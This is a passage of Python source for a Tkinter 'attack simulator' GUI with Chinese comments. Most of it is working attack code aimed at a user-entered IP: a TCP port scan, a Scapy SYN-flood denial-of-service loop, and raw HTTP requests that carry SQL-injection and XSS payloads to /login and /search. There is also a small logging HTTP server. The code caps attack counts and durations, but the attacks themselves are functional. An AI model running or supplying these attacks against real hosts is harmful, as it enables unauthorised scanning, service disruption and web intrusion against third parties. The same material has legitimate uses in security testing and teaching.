                    log_msg = f"[+] 发送 {attack_name} 载荷 ({i+1}/{count}): {payload}"
                    self._log(log_msg)
                    
                    time.sleep(0.5)
                
                except Exception as e:
                    self._log(f"[!] 攻击过程中出错: {e}")
            
            self._log(f"[*] {attack_name}攻击完成，共发送 {min(i+1, count)} 个请求")
        
        except Exception as e:
            self._log(f"[!] {attack_name}攻击过程中出错: {e}")
        
        # 攻击结束
        if self.is_attacking:
            self.root.after(0, lambda: self.status_var.set(f"{attack_name}攻击完成: {target_ip}"))
        else:
            self.root.after(0, lambda: self._log(f"[!] {attack_name}攻击被用户中断"))
            self.root.after(0, lambda: self.status_var.set("攻击已停止"))
        
        # 启用所有攻击按钮
        self.root.after(0, self._enable_attack_buttons)
        self.is_attacking = False
    
    def _start_all_attacks(self):
        """开始综合攻击"""
        target = self.all_target_var.get()
        port = self.all_port_var.get()
        duration = self.all_duration_var.get()
        intensity = self.all_intensity_var.get()
        
        if not target:
            messagebox.showerror("错误", "请输入目标IP")
            return
        
        # 检查选择的攻击类型
        selected_attacks = []
        if self.port_scan_var.get():
            selected_attacks.append("portscan")
        if self.dos_var.get():
            selected_attacks.append("dos")
        if self.sqli_var.get():
            selected_attacks.append("sqli")
        if self.xss_var.get():
            selected_attacks.append("xss")
        
        if not selected_attacks:
            messagebox.showerror("错误", "请选择至少一种攻击类型")
            return
        
        self._log(f"开始对 {target}:{port} 进行综合攻击...")
        self.status_var.set(f"正在攻击: {target}")
        
        # 禁用所有攻击按钮
        self._disable_attack_buttons()
        
        # 在新线程中运行攻击
        self.is_attacking = True
        self.attack_thread = threading.Thread(
            target=self._all_attacks_worker,
            args=(target, port, duration, intensity, selected_attacks)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
    
    def _all_attacks_worker(self, target_ip, target_port, duration, intensity, attack_types):
        """实现综合攻击"""
        try:
            self._log(f"[*] 开始对 {target_ip}:{target_port} 进行综合攻击...")
            
            # 端口扫描
            if "portscan" in attack_types and self.is_attacking:
                self._log("[*] 执行端口扫描攻击...")
                start_port = 1
                end_port = 1000
                scan_type = "TCP"
                
                open_ports = []
                for port in range(start_port, min(end_port + 1, 100)):  # 限制扫描范围
                    if not self.is_attacking:
                        break
                    
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.1)
                        result = sock.connect_ex((target_ip, port))
                        if result == 0:
                            open_ports.append(port)
                            self._log(f"[+] 端口 {port}/tcp 开放")
                        sock.close()
                    except:
                        pass
                
                self._log(f"[*] 扫描完成，发现 {len(open_ports)} 个开放端口")
            
            # DoS攻击
            if "dos" in attack_types and self.is_attacking:
                self._log("[*] 执行DoS攻击...")
                dos_duration = min(duration, 5)  # 限制DoS时间
                dos_type = "SYN"
                
                end_time = time.time() + dos_duration
                packet_count = 0
                
                while time.time() < end_time and self.is_attacking:
                    try:
                        packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
                        send(packet, verbose=0)
                        packet_count += 1
                        
                        if packet_count % 10 == 0:
                            self._log(f"[*] DoS攻击: 已发送 {packet_count} 个数据包")
                            time.sleep(0.1)
                    except Exception as e:
                        self._log(f"[!] DoS攻击过程中出错: {e}")
                
                self._log(f"[*] DoS攻击完成，共发送 {packet_count} 个数据包")
            
            # SQL注入攻击
            if "sqli" in attack_types and self.is_attacking:
                self._log("[*] 执行SQL注入攻击...")
                sqli_count = min(intensity, 5)  # 限制次数
                
                for i in range(sqli_count):
                    if not self.is_attacking:
                        break
                    
                    try:
                        payload = random.choice(SQL_INJECTION_PAYLOADS)
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((target_ip, target_port))
                        
                        http_request = f"GET /login?username={payload}&password=test HTTP/1.1\r\n"
                        http_request += f"Host: {target_ip}\r\n"
                        http_request += "Connection: close\r\n\r\n"
                        
                        sock.send(http_request.encode())
                        sock.close()
                        
                        self._log(f"[+] SQL注入攻击: 发送载荷 {i+1}/{sqli_count}")
                        time.sleep(0.5)
                    except Exception as e:
                        self._log(f"[!] SQL注入攻击过程中出错: {e}")
                
                self._log("[*] SQL注入攻击完成")
            
            # XSS攻击
            if "xss" in attack_types and self.is_attacking:
                self._log("[*] 执行XSS攻击...")
                xss_count = min(intensity, 5)  # 限制次数
                
                for i in range(xss_count):
                    if not self.is_attacking:
                        break
                    
                    try:
                        payload = random.choice(XSS_PAYLOADS)
                        
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)
                        sock.connect((target_ip, target_port))
                        
                        http_request = f"GET /search?q={payload} HTTP/1.1\r\n"
                        http_request += f"Host: {target_ip}\r\n"
                        http_request += "Connection: close\r\n\r\n"
                        
                        sock.send(http_request.encode())
                        sock.close()
                        
                        self._log(f"[+] XSS攻击: 发送载荷 {i+1}/{xss_count}")
                        time.sleep(0.5)
                    except Exception as e:
                        self._log(f"[!] XSS攻击过程中出错: {e}")
                
                self._log("[*] XSS攻击完成")
            
            self._log("[*] 综合攻击完成")
        
        except Exception as e:
            self._log(f"[!] 综合攻击过程中出错: {e}")
        
        # 攻击结束
        if self.is_attacking:
            self.root.after(0, lambda: self.status_var.set(f"综合攻击完成: {target_ip}"))
        else:
            self.root.after(0, lambda: self._log("[!] 综合攻击被用户中断"))
            self.root.after(0, lambda: self.status_var.set("攻击已停止"))
        
        # 启用所有攻击按钮
        self.root.after(0, self._enable_attack_buttons)
        self.is_attacking = False
    
    def _stop_attack(self):
        """停止当前攻击"""
        if self.is_attacking:
            self.is_attacking = False
            self._log("[*] 正在停止攻击...")
            self.status_var.set("正在停止攻击...")
            
            # 等待线程结束
            if self.attack_thread and self.attack_thread.is_alive():
                self.attack_thread.join(timeout=2)
            
            self._log("[*] 攻击已停止")
            self.status_var.set("攻击已停止")
            
            # 启用所有攻击按钮
            self._enable_attack_buttons()
    
    def _start_http_server(self):
        """启动HTTP服务器"""
        port = self.http_port_var.get()
        
        # 清空日志
        self.http_log_text.delete(1.0, tk.END)
        
        try:
            from http.server import HTTPServer, SimpleHTTPRequestHandler
            
            class CustomHandler(SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    self.gui = kwargs.pop('gui')
                    super().__init__(*args, **kwargs)
                
                def log_message(self, format, *args):
                    message = format % args
                    self.gui.root.after(0, lambda: self.gui._update_http_log(f"{self.client_address[0]} - {message}"))
                
                def do_GET(self):
                    self.gui.root.after(0, lambda: self.gui._update_http_log(f"{self.client_address[0]} - GET {self.path}"))
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    response = f"<html><body><h1>Test Server</h1><p>Path: {self.path}</p></body></html>"
                    self.wfile.write(response.encode())
            
            # 创建HTTP服务器
            handler = lambda *args, **kwargs: CustomHandler(*args, gui=self, **kwargs)
            self.http_server = HTTPServer(('', port), handler)
            
            self._log(f"[*] 启动HTTP服务器在端口 {port}")
            self.status_var.set(f"HTTP服务器运行中: 端口 {port}")
            
            # 禁用启动按钮，启用停止按钮
            self.http_start_btn.config(state=tk.DISABLED)
            self.http_stop_btn.config(state=tk.NORMAL)
            
            # 在新线程中运行服务器
            self.http_server_thread = threading.Thread(target=self.http_server.serve_forever)
            self.http_server_thread.daemon = True
            self.http_server_thread.start()
            
            # 显示本地IP
            local_ip = self._get_local_ip()
            self._update_http_log(f"[*] 服务器地址: http://{local_ip}:{port}/")
            self._update_http_log(f"[*] 本地访问: http://localhost:{port}/")
            self._update_http_log("[*] 服务器已启动，等待连接...")
        
        except Exception as e:
            self._log(f"[!] 启动HTTP服务器失败: {e}")
            messagebox.showerror("错误", f"启动HTTP服务器失败: {e}")
    
    def _stop_http_server(self):
        """停止HTTP服务器"""
        if self.http_server:
            self.http_server.shutdown()
            self.http_server = None
            
            self._log("[*] HTTP服务器已停止")
            self.status_var.set("HTTP服务器已停止")
            self._update_http_log("[*] 服务器已停止")
            
            # 启用启动按钮，禁用停止按钮
            self.http_start_btn.config(state=tk.NORMAL)
            self.http_stop_btn.config(state=tk.DISABLED)
    
    def _update_http_log(self, message):
        """更新HTTP服务器日志"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"
        self.http_log_text.insert(tk.END, log_message)
        self.http_log_text.see(tk.END)
    
    def run(self):
        """运行攻击模拟器"""
        self.root.mainloop()


def main():
    """主函数"""
    print("[启动] 攻击模拟器 GUI")
    app = AttackSimulatorGUI()
    app.run()


if __name__ == "__main__":
    main()
